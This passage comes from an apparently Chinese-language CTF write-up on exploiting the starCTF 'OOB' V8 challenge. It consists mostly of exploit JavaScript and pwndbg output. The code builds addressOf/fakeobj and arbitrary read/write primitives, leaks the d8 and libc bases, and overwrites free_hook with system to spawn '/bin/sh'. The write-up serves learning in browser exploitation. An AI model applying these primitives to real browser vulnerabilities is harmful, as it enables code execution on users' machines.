<span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var a_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] addressOf a: 0x&quot; + hex(a_addr));</span></span><br><span class="line"><span class="comment">read64(a_addr);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment">write64(a_addr, 0x01020304n);</span></span><br><span class="line"><span class="comment">%SystemBreak();</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>方法A：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000038ebfeb8f9a0-0x8000 0x5000</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x38ebfeb89ef8 —▸ 0x1b4669081f49 ◂— 0x300001b46690801</span><br><span class="line">4ac:2560│   0x38ebfeb89f00 ◂— 0x7b837e1e6</span><br><span class="line">4ad:2568│   0x38ebfeb89f08 —▸ 0xcd44db0a001 ◂— 0xe600001b46690804</span><br><span class="line">4ae:2570│   0x38ebfeb89f10 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4af:2578│   0x38ebfeb89f18 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">4b0:2580│   0x38ebfeb89f20 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4b1:2588│   0x38ebfeb89f28 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">pwndbg&gt; x&#x2F;gx 0x55dc49c98e40</span><br><span class="line">0x55dc49c98e40 &lt;_ZN2v812_GLOBAL__N_118WebAssemblyCompileERKNS_20FunctionCallbackInfoINS_5ValueEEE&gt;:0x56415741e5894855</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var start_addr &#x3D; addressOf(a);</span><br><span class="line">var leak_d8_addr &#x3D; 0n;</span><br><span class="line">start_addr &#x3D; start_addr-0x8000n;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    start_addr &#x3D; start_addr-8n;</span><br><span class="line">    leak_d8_addr &#x3D; read64(start_addr);</span><br><span class="line">    if(((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000560000000e40n)||((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000550000000e40n))&#123;</span><br><span class="line">        console.log(&quot;leak process addr success: &quot;+hex(leak_d8_addr));</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了半天，没泄露出来…</p><p>方法B：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*------------------------------leak d8------------------------------*&#x2F;</span><br><span class="line">var code &#x3D; read64(addressOf(floatArray.constructor)-0x1n+0x30n); &#x2F;&#x2F;get constructor.code ptr</span><br><span class="line">var d8Leak &#x3D; read64(code-0x1n+0x40n) &gt;&gt; 16n; &#x2F;&#x2F;read addr from &quot;mov r10, addr&quot;</span><br><span class="line">var d8Base &#x3D; d8Leak - 0xad54e0n;</span><br><span class="line">console.log(&quot;[*] d8 base : &quot; + hex(d8Base));</span><br></pre></td></tr></table></figure><blockquote><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test_array = [<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array.constructor);</span><br><span class="line">%SystemBreak();</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; pwd</span><br><span class="line">xxx/v8/out.gn/x64.debug</span><br><span class="line">...</span><br><span class="line">DebugPrint: <span class="number">0x24741f34ddb9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">DebugPrint: <span class="number">0x39ddc5310ec1</span>: [<span class="built_in">Function</span>] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5302109</span> &lt;JSFunction (sfi = <span class="number">0x18405dc08039</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x39ddc5311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x3fb2ce6c2d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x18405dc0aca1</span> &lt;SharedFunctionInfo <span class="built_in">Array</span>&gt;</span><br><span class="line"> - name: 0x2df35e643599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x39ddc5301869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x11c169a06c01</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x39ddc5311029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x18405dc00449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x18405dc00529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    <span class="number">0x2df35e644c79</span> &lt;<span class="built_in">Symbol</span>: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x2df35e644f41</span> &lt;<span class="built_in">Symbol</span>: <span class="built_in">Symbol</span>.species&gt;: <span class="number">0x39ddc5310fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: 0x39ddc5311069 &lt;JSFunction isArray (sfi = 0x18405dc0ad39)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x39ddc53110a1 &lt;JSFunction from (sfi = 0x18405dc0ad89)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x39ddc53110d9 &lt;JSFunction of (sfi = 0x18405dc0adc1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; job <span class="number">0x3fb2ce6c2ed9</span></span><br><span class="line"><span class="number">0x3fb2ce6c2ed9</span>: [<span class="built_in">Map</span>]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: <span class="number">0x3fb2ce6c2e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x18405dc00609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #1: 0x39ddc5311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x39ddc5311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     <span class="number">0x2df35e644ba1</span> &lt;<span class="built_in">Symbol</span>: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x3fb2ce6c2f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="keyword">constructor</span>: 0x39ddc5310ec1 &lt;JSFunction Array (sfi = 0x18405dc0aca1)&gt;</span><br><span class="line"> - dependent code: 0x2df35e6402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x39ddc5310ec1-1</span><br><span class="line">0x39ddc5310ec0:0x00003fb2ce6c2d490x000039ddc5311029</span><br><span class="line">0x39ddc5310ed0:0x00002df35e640c710x000018405dc0aca1</span><br><span class="line">0x39ddc5310ee0:0x000039ddc53018690x000018405dc00699</span><br><span class="line">0x39ddc5310ef0:0x000011c169a06c010x00003fb2ce6c2d99</span><br><span class="line">0x39ddc5310f00:0x00002df35e6402710x0000000000080008</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x 0x39ddc5310ef0-0x39ddc5310ec0</span><br><span class="line">$1 = 0x30</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x11c169a06c01+0x40-1</span><br><span class="line">00:0000│   0x11c169a06c40 ◂— movabs r10, 0x7f5949700fa0</span><br><span class="line">01:0008│   0x11c169a06c48 ◂— add    byte ptr [rax], al</span><br><span class="line">02:0010│   0x11c169a06c50 ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x11c169a06c60 —▸ 0x2df35e640a31 ◂— 0x2df35e6401</span><br><span class="line">05:0028│   0x11c169a06c68 —▸ 0x2df35e642c01 ◂— 0x2df35e6407</span><br><span class="line">06:0030│   0x11c169a06c70 —▸ 0x2df35e640c71 ◂— 0x2df35e6408</span><br><span class="line">07:0038│   0x11c169a06c78 —▸ 0x2df35e642791 ◂— 0x2df35e6407</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x7f5949700fa0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7f5948274000     0x7f5949d8a000 r-xp  1b16000 136c000 /home/focu5/chromium/v8/out.gn/x64.debug/libv8.so +0x148cfa0</span><br></pre></td></tr></table></figure><p>在<code>release</code>版本下，则会泄露出 <code>d8</code>的地址</p><h4 id="本地shell"><a href="#本地shell" class="headerlink" title="本地shell"></a>本地shell</h4><p>有了<code>libc</code>剩下就可以和常规<code>pwn</code>一样了，有任意地址写，直接写<code>free_hook</code>就好。</p><p>在调试的时候发现写0x7f…这样的地址写不上去，看<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">e3pem师傅的博客</a>发现另一种写法</p><blockquote><p>这里有另外一种方式来解决这个问题，DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>，修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var data_buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line">function writeDataview(addr,data)&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(0, data, true);</span><br><span class="line">    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> d8_addr = read64(code_addr + <span class="number">0x41n</span>) - <span class="number">0x8424e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc d8_addr: 0x&quot;</span> + hex(d8_addr));</span><br><span class="line">got_printf = d8_addr + <span class="number">0xb073c8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] got_printf: 0x&quot;</span> + hex(got_printf));</span><br><span class="line">libc_base = read64(got_printf)- <span class="number">0x64f00n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc: 0x&quot;</span> + hex(libc_base));</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line">system = libc_base + <span class="number">0x4f4e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook: 0x&quot;</span> + hex(free_hook));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system: 0x&quot;</span> + hex(system));</span><br><span class="line">writeDataview(free_hook, system)</span><br><span class="line"><span class="keyword">var</span> shell_str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;/bin/sh\0&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><blockquote><p><strong>WebAssembly</strong>或称<strong>wasm</strong>是一个实验性的<a href="https://zh.wikipedia.org/wiki/%E4%BD%8E%E7%BA%A7%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">低级编程语言</a>，应用于<a href="https://zh.wikipedia.org/wiki/%E7%80%8F%E8%A6%BD%E5%99%A8">浏览器</a>内的<a href="https://zh.wikipedia.org/wiki/%E5%AE%A2%E6%88%B6%E7%AB%AF">客户端</a>。WebAssembly是便携式的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9">抽象语法树</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-1">1]</a>，被设计来提供比<a href="https://zh.wikipedia.org/wiki/JavaScript">JavaScript</a>更快速的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">编译</a>及运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-github.com-2">2]</a>。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以<a href="https://zh.wikipedia.org/wiki/C%E8%AA%9E%E8%A8%80">C</a>/<a href="https://zh.wikipedia.org/wiki/C%2B%2B">C++</a>作为实现目标）编译，再藉虚拟机引擎在浏览器内运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-3">3]</a>。WebAssembly的开发团队分别来自<a href="https://zh.wikipedia.org/wiki/Mozilla%E5%9F%BA%E9%87%91%E6%9C%83">Mozilla</a>、<a href="https://zh.wikipedia.org/wiki/Google">Google</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BB%9F">Microsoft</a>、<a href="https://zh.wikipedia.org/wiki/%E8%98%8B%E6%9E%9C%E5%85%AC%E5%8F%B8">Apple</a>，代表着四大网络浏览器<a href="https://zh.wikipedia.org/wiki/Firefox">Firefox</a>、<a href="https://zh.wikipedia.org/wiki/Google_Chrome">Chrome</a>、<a href="https://zh.wikipedia.org/wiki/Microsoft_Edge">Microsoft Edge</a>、<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-4">4]</a>。2017年11月，以上四个浏览器都开始实验性的支持WebAssembly[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-5">5]</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-6">6]</a>。WebAssembly 于 2019 年 12 月 5 日成为万维网联盟（W3C）的推荐，与 HTML，CSS 和 JavaScript 一起，成为 Web 的第四种语言。[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-7">7]</a>。</p></blockquote><p><a 